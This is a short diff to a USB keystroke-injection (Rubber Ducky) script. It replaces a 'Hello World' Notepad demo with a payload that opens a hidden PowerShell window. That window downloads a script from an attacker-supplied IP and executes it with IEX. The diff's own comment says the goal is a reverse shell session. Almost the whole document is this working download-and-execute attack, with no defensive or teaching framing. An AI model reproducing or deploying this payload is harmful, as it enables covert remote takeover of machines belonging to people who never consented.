@@ -1,6 +1,5 @@
-REM The next four lines open Notepad in Windows and type "Hello World!"
+REM Below code will create a reverse shell session using a powershell script hosted on a webserver
 GUI r
-STRING notepad
+DELAY 100
+STRING powershell "Start-Process powershell {"-WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://<INSERT IP ADDR>/psr.ps1')"} -WindowStyle Hidden"
 ENTER
-DELAY 250
-STRING Hello World!
